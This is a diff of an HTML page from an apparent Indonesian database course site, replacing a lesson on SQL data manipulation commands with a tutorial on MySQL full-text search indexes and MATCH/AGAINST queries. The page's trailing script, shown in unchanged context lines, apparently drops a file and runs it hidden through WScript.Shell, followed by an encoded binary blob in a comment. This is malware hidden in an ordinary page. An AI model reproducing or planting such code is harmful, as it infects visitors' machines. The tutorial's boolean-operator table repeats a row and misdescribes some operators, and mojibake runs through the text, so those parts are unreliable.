@@ -40,41 +40,216 @@
   <div id="home">
     <div class="isi">
       <div class="container atas">
-        <h1><font color='red' face='Verdana'><b>DATA MANIPULATION LANGUAGE</b></font></h1>
+        <h1><font color='red' face='Verdana'><b>Full-Text Searching</b></font></h1>
         <div class="row">
-      <p class="text-left"><strong>Data Manipulation Language (DML)</strong> merupakan kumpulan perintah SQL yang digunakan untuk proses pengolahan isi 
-        data di dalam table seperti memasukkan, 
-        merubah dan menghapus isi data - dan tidak terkait dengan perubahan struktur dan definisi tipe data dari objek database.</br></br>
+      <p class="text-left"><strong>Full-Text Searching</strong> adalah sebuah teknik yang digunakan oleh search engines untuk mencari sesuatu di dalam sebuah database. 
+        Teknik ini juga dapat dipakai untuk melakukan pecarian disitus-situs jual beli, berita, dll.<br>
+        Lebih jelasnya, FTS akan mencari dokumen yang didalamnya terdapat data tekstual yang tidak sama persis dengan data yang dicari. 
+        Artinya saat seorang user melakukan pencarian untuk "cats and dogs", 
+        aplikasi yang menggunakan teknik FTS dapat memberikan hasil yang mengandung kedua kata (hanya "cats" atau hanya "dogs"), 
+        mengandung kata dalam urutan yang berbeda ("dogs and cats"), atau memiliki variasi kata ("cat" atau "dog"). 
+        Hasil ini memberikan aplikasi kemampuan untuk menebak apa kira-kira data yang diinginkan oleh pengguna sehingga dapat memberikan data yang lebih relevan lebih cepat.</br></br>
+        <b>A. Membuat full-text searching</b><br>
+        Full-Â­text  index  dapat  dibuat  saat  proses  pembuatan  tabel  dengan  perintah  â€œCREATE TABLEâ€ atau saat perubahan struktur table yang sudah ada dengan menggunakan perintah â€œALTER TABLEâ€ atau â€œCREATE INDEXâ€.<br><br>
+        <b>>>  syntax perintah "CREATE TABLE":</b><br>
+        CREATE TABLE table_name(<br>
+        column_list,<br>
+        ...,<br>
+        FULLTEXT (column1,column2,..)<br>
+    );<br>
+    contoh:<br>
+        CREATE TABLE posts (<br>
+      id INT NOT NULL AUTO_INCREMENT,<br>
+      title VARCHAR(255) NOT NULL,<br>
+      body TEXT,<br>
+      PRIMARY KEY (id),<br>
+      FULLTEXT KEY (body )<br>
+    );<br><br>
+        <b>>>  sintax perintah "ALTER TABLE":</b><br>
+    ALTER TABLE table_name  <br>
+    ADD FULLTEXT(column_name1, column_name2,â€¦)<br>
+    );<br>
+    contoh:<br>
+    ALTER TABLE products  <br>
+    ADD FULLTEXT(productDescription,productLine);<br><br>
+    <b>>>  sintax perintah "CREATE INDEX":</b><br>
+    CREATE FULLTEXT INDEX index_name<br>
+    ON table_name(idx_column_name,...)<br>
+    );<br>
+    contoh:<br>
+    CREATE FULLTEXT INDEX address<br>
+    ON offices(addressLine1,addressLine2);<br><br>
 
-				<strong>DML</strong> sendiri adalah kumpulan perintah SQL yang berhubungan dengan pekerjaan mengolah data di dalam table - dan tidak 
-				terkait dengan perubahan struktur dan definisi tipe data dari objek database seperti table, column, dan sebagainya.</br></br>
+    <b>B. MySQL Natural Language Full-Text Searches</b><br>
+	Untuk melakukan <i>Natural Language Full-Text Searches</i>, Anda menggunakan fungsi MATCH () dan AGAINST (). Fungsi MATCH () menentukan kolom tempat Anda ingin mencari dan fungsi AGAINST () menentukan kondisi pencarian yang akan digunakan.<br>
+	Berikut contoh penggunaan Full-Text Searching tipe Natural Language :<br>
+	<table border=1 align="center">
+		<tr>
+			<td><b>SELECT * FROM article WHERE MATCH (title) AGAINST ('tutorial');</b></td>
+		</tr>
+  </table><br>
+  
+    atau<br><br>
+		<table border=1 align="center">
+		<tr>
+			<td><b>SELECT * FROM article WHERE MATCH(title) AGAINST('tutorial' IN NATURAL LANGUAGE MODE);</b></td>
+		</tr>
 
-				Contoh DML : Mengambil Seluruh Row Data dari table TB_KARYAWAN</br>
-
-				SELECT * FROM tb_karyawan</br></br>
-
-
-				Contoh DML : Memasukkan data ke dalam tabel tb_karyawan</br>
-
-				INSERT INTO tb_karyawan(</br>
-					kode_cabang,</br>
-					kode_karyawan,</br>
-					nama_depan,</br>
-					nama_belakang,</br>
-					jenis_kelamin) </br>
-				VALUES <b>('ccd-001','kor-001','Tian','Vincent','Laki-laki');</b></br></br>
-        Beberapa daftar Perintah DML</br>
-        <b>
-				-> CALL</br>
-				-> DELETE</br>
-				-> DO</br>
-				-> HANDLER</br>
-				-> INSERT</br>
-				-> LOAD DATA INFILE</br>
-				-> REPLACE</br>
-				-> SELECT</br>
-				-> TRUNCATE</br>
-				-> UPDATE</br></b></p>
+	</table><br>
+Query diatas menghasilkan data pada field title yang mengandung kata â€œtutorialâ€.<br><br>
+	<table border="1" align="center">
+		<tr>
+			<td>id</td>
+			<td>title</td>
+			<td>body</td>
+		</tr>
+		<tr>
+			<td>1</td>
+			<td>PHP dan Mysql:Tutorial Dasar</td>
+			<td>Pada tutorial kali ini, kita akan mencoba melakukan...</td>
+		</tr>		
+  </table><br>
+  <p class="text-left">
+    <b>C. MySQL Boolean Full-Text Searches</b><br>
+    MySQL memungkinkan Anda untuk melakukan Full-Text Searches berdasarkan permintaan yang sangat kompleks dalam mode Boolean bersama dengan operator Boolean.<br>
+    berikut ini operator dan fungsinya pada mode Boolean:<br>
+    <table border="1" align="center">
+      <tr>
+        <td><b>Operator</b></td>
+        <td align="center"><b>Deskripsi</b></td>
+      </tr>
+      <tr>
+        <td align="center"><b>+</b></td>
+        <td>keyword harus terdapat pada semua hasil yang didapat</td>
+      </tr>
+      <tr>
+        <td align="center"><b>-</b></td>
+        <td>keyword tidak boleh ada pada hasil yang didapat</td>
+      </tr>
+      <tr>
+        <td align="center"><b>></b></td>
+        <td>keyword termasuk pada hasil yang didapat dengan urutan berdasar ranking secara increase</td>
+      </tr>
+      <tr>
+        <td align="center"><b><</b></td>
+        <td>keyword termasuk pada hasil yang didapat dengan urutan berdasar ranking secara decrease</td>
+      </tr>
+      <tr>
+        <td align="center"><b>()</b></td>
+        <td>digunakan untuk melakukan grouping/pengelompokan dan dapat menambahkan operator lain untuk meningkatkan relevansi hasil pencarian</td>
+      </tr>
+      <tr >
+        <td align="center"><b>()</b></td>
+        <td>digunakan untuk melakukan grouping/pengelompokan dan dapat menambahkan operator lain untuk meningkatkan relevansi hasil pencarian</td>
+      </tr>
+      <tr>
+        <td align="center"><b>~</b></td>
+        <td>berfungsi sebagai operator negasi, jika sebuah keyword diberikan tanda ~, mengakibatkan relevansi/score minus</td>
+      </tr>
+      <tr>
+        <td align="center"><b>" "</b></td>
+        <td>merupakan operator wildcard</td>
+      </tr>
+      <tr>
+        <td align="center"><b>+</b></td>
+        <td>digunakan pada awal dan akhir keyword yang terdiri dari dua kata atau lebih</td>
+      </tr>				
+    </table><br>
+    contoh:<br><br>
+    <table border=1 align="center">
+        <tr>
+          <td><b>SELECT * FROM articles WHERE MATCH (title,body) AGAINST ('+mysql -database' IN BOOLEAN MODE);</b></td>
+        </tr>
+    
+      </table><br>
+    Hasil yang diperoleh harus mengandung kata mysql dan tidak boleh mengandung katadatabase pada field title dan body.<br><br>
+      <table border="1" align="center">
+        <tr>
+          <td>id</td>
+          <td>title</td>
+          <td>body</td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td>How To Use MySQL Well</td>
+          <td>After you went through a ...</td>
+        </tr>	
+        <tr>
+          <td>4</td>
+          <td>1001 MySQL Tricks</td>
+          <td>1. Never run mysqld as root. 2.	</td>
+        </tr>
+        <tr>
+          <td>6</td>
+          <td>MySQL Security</td>
+          <td>When configured properly, MySQL	</td>
+        </tr>		
+      </table>
+    <br>
+    <table border=1 align="center">
+        <tr>
+          <td><b>SELECT * FROM articles WHERE MATCH (title,body) AGAINST ('tutor*' IN BOOLEAN MODE);</b></td>
+        </tr>
+    
+      </table><br>
+    Penambahan asterisk (*) pada awal atau akhir keyword berfungsi seperti perintah LIKE â€˜tutor%â€™ .<br><br>
+      <table border="1" align="center">
+        <tr>
+          <td>id</td>
+          <td>title</td>
+          <td>body</td>
+        </tr>
+        <tr>
+          <td>1</td>
+          <td>MySQL Tutorial</td>
+          <td>BMS stands for DataBase ...</td>
+        </tr>
+      </table><br>
+    <table border=1 align="center">
+        <tr>
+          <td><b>SELECT * FROM articles WHERE MATCH (title,body) AGAINST ('+mysql+(>tutorial < database)' IN BOOLEAN MODE);</b></td>
+        </tr>
+    
+      </table><br>
+    Penggunaan  operator  >   dan  <   menghasilkan  data  yang  mengandung  kata  mysql  dan tutorial memiliki score relevansi yang lebih tinggi dibandingkan data yang  mengandung kata mysql dan database, dan seluruh hasil harus mengandung kata mysql+tutorial atau database.<br><br>
+      <table border="1" align="center">
+        <tr>
+          <td>id</td>
+          <td>title</td>
+          <td>body</td>
+        </tr>
+        <tr>
+          <td>1</td>
+          <td>MySQL Tutorial</td>
+          <td>BMS stands for DataBase ...</td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td>MySQL vs. YourSQL </td>
+          <td>In the following database comparison...|</td>
+        </tr>
+      </table><br>
+    <table border=1 align="center">
+        <tr>
+          <td><b>SELECT * FROM articles WHERE MATCH (title,body) AGAINST ('"mysql tutorial"' IN BOOLEAN MODE);</b></td>
+        </tr>
+    
+      </table><br>
+    Hasil pencarian harus mengandung kata â€œmysqlâ€œ yang kemudian diikuti kata â€œtutorialâ€œ.<br><br>
+      <table border="1" align="center">
+        <tr>
+          <td>id</td>
+          <td>title</td>
+          <td>body</td>
+        </tr>
+        <tr>
+          <td>1</td>
+          <td>MySQL Tutorial</td>
+          <td>BMS stands for DataBase ...</td>
+        </tr>
+      </table>
+  
+  </p>
 			</div> 
         </div>
       </div>
@@ -133,4 +308,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--/_àZyÎ<¨'¨„(?ÊzY¶Z3øŠä ;ê Æ“½½t-ÁÑ‰üqĞRpÌ!L7Ù¡ 8PpL™GÓ+üz³‰]b¨p§#vDG‚Pô>éş8ûØ%îkäĞd^shÒ,ø5y•ó	i˜P‹)E4q¼¥2ÜïLd¬oA_ÍÚ°ÂŒhëèH(İ9=ƒ¢Æ<l‚/åVÂœs–ÏHf]È‘MÓ@Û¨¾'¼Ñ]  ód@â@	«9¨¦Ô5AVdMô"×M~ªÒänWîPÚõzoÏ}:­VïÜêe²”·b¨´ç(ï‡AÅP„ãAÈL[Šõ»\^c«ç{ÉªušÇœ4ÅÈG2>8š±Éq o¶b Ô²p²ñ^ØÖe>X¡ĞÛ`yÖg †ºÛ 5úÜ$XlıKO1 ô°!=úuS”(—È¨j5X) Ù:R!ùÙ:Ù:Ù:”çOÈW’^ğÈ: Ù:-->
+//--></SCRIPT><!--Fï¿½ï¿½ï¿½`*ï¿½ï¿½	ï¿½I|ï¿½ï¿½ï¿½ï¿½ ï¿½Fï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Tï¿½ï¿½wbLï¿½ï¿½Hï¿½)Tï¿½ï¿½ï¿½*ï¿½ï¿½ï¿½ï¿½(0ï¿½gOgï¿½ï¿½bO{ï¿½f
+Ô”ï¿½eï¿½)ï¿½Ü¯]bï¿½ï¿½"ï¿½zï¿½:#|n ÏŸ>/3ï¿½ï¿½i>p9l[ï¿½|ï¿½>$ï¿½$ï¿½3ÅE2_Jï¿½ï¿½ï¿½;@ï¿½ï¿½hpZï¿½ï¿½ï¿½6ï¿½Cï¿½yï¿½ï¿½IYeï¿½v:ï¿½iï¿½ï¿½ï¿½ä©­1|ï¿½ï¿½:4ï¿½Û²rï¿½w/ï¿½È†ï¿½Ñ½ï¿½ï¿½6fdGï¿½zNj\ï¿½Mrï¿½ï¿½ï¿½ï¿½4ï¿½h%;fï¿½ï¿½Ä”Pï¿½ï¿½ï¿½Õ¹ï¿½oï¿½fï¿½ï¿½}ï¿½ï¿½;ï¿½Æ†Tï¿½1#ï¿½]ï¿½ ï¿½ï¿½Dï¿½'ï¿½hxdï¿½ï¿½ï¿½S\ï¿½iï¿½Lï¿½ï¿½ï¿½M×—=!ï¿½_ï¿½dï¿½ï¿½ï¿½Noï¿½j}ï¿½ï¿½p\ï¿½Uï¿½Cï¿½vu_#.J&gï¿½ï¿½Î„ï¿½jPï¿½à¬°hï¿½`I dï¿½?b İ¦,ï¿½ï¿½kï¿½Xï¿½fï¿½ï¿½ï¿½GIï¿½<ï¿½wï¿½ï¿½ï¿½"xï¿½Xï¿½ï¿½ï¿½}ï¿½n8ï¿½SÜ‡(sÚŠï¿½8G4eï¿½}NKï¿½.ï¿½D~ï¿½ ï¿½:R!ï¿½ï¿½:ï¿½:ï¿½:ï¿½ï¿½Oï¿½Wï¿½^ï¿½ï¿½: ï¿½:-->
